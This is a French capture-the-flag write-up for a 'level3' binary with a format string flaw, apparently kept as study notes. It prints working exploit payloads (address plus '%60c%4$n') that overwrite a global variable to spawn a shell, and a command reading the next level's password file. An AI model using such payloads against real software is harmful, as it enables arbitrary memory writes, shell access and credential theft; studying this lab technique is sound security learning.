# Level 3 - Format String Vulnerability

## Le bug en une phrase
Le code fait `printf(input)` au lieu de `printf("%s", input)`.
Du coup ce qu'on tape devient le **format string** de printf : si on tape `%p`, `%n`...
printf les interprète comme des instructions au lieu de les afficher comme texte.

But : écrire 64 (0x40) dans la variable globale `m` pour déclencher `system("/bin/sh")`.

## Les concepts à se rappeler

- `printf` a des "codes" qui commencent par `%` : `%d` affiche un nombre, `%p` une
  valeur de la stack, et `%n` **ÉCRIT** en mémoire (il écrit le nombre de caractères
  déjà affichés à une adresse).
- `%n` écrit où ? À l'adresse qu'il trouve sur la **stack**. C'est là tout le truc.
- Notre input (`local_20c`) est lui-même posé sur la stack. Donc si on met une adresse
  au début de notre input, `%n` peut l'utiliser comme cible d'écriture.
- Il faut donc 2 choses :
  - **l'adresse de m** (où écrire) → on la met au début de l'input
  - **la position de notre input sur la stack** (pour que %n aille y chercher l'adresse)

## Analyse avec Ghidra

1. Ouvrir le binaire `level3` dans Ghidra
2. Aller dans la fonction `v`
3. Cliquer sur la variable `m` dans le code décompilé → noter son adresse : `0x0804988c`
4. Le code vulnérable :
```c
fgets(local_20c, 0x200, stdin);
printf(local_20c);          // ← format string vulnerability
if (m == 0x40) {            // 0x40 = 64
    system("/bin/sh");
}
```

## Étape 1 : trouver la position de notre input sur la stack

```bash
python -c 'print "AAAA %p %p %p %p %p %p %p %p %p %p"' | ./level3
```

Chaque `%p` affiche une valeur de la stack, une par une. On cherche `0x41414141`
dans la sortie (= `AAAA`, car `A` = 0x41). Sa position dans la liste = la position
de notre input.

Ici on l'a trouvé en **4ème** position. (Les positions 1-3 sont des données internes
du programme posées sur la stack avant notre buffer, on s'en fiche.)

## Étape 2 : construire le payload

```
\x8c\x98\x04\x08   %60c   %4$n
   adresse de m    60 c    écris à la position 4
   (little-endian)         (= là où est notre input, qui contient l'adresse de m)
```

- `\x8c\x98\x04\x08` → adresse de m écrite à l'envers (little-endian) = 4 octets
- `%60c` → affiche 60 caractères → total affiché = 4 + 60 = 64 = 0x40
- `%4$n` → va à la position 4 de la stack, y trouve l'adresse de m, écrit 64 dedans

Astuce : `%60c` évite de taper 60 fois "A".

## Étape 3 : exploit

```bash
(python -c 'print "\x8c\x98\x04\x08%60c%4$n"'; cat) | ./level3
(printf '\x8c\x98\x04\x08%%60x%%4$n'; cat) | ./level3
```

Le `cat` (sans argument) lit le clavier et le recopie dans le tuyau, donc on peut
taper des commandes après le `system("/bin/sh")`. Sinon le tuyau se ferme dès que
python finit et le shell se ferme tout de suite.
Attention : il faut un truc qui transmet le clavier (`cat`), pas juste une commande
qui bloque (`sleep` garderait le shell vivant mais on pourrait pas lui parler).

Variante équivalente : écrire le payload dans un fichier puis le rejouer avec `cat -` :
```bash
python -c 'print "\x8c\x98\x04\x08%60c%4$n"' > /tmp/payload
cat /tmp/payload - | ./level3
```
`cat /tmp/payload -` = envoie d'abord le fichier (l'exploit), puis le `-` continue
avec le clavier. L'ordre compte : le fichier avant le `-`.

Quand ça marche, `Wait what?!` s'affiche (= m vaut bien 64).

## Récupérer le flag

```bash
/bin/cat /home/user/level4/.pass
```
(chemin complet car `cat` tout seul n'est pas trouvé dans ce shell)
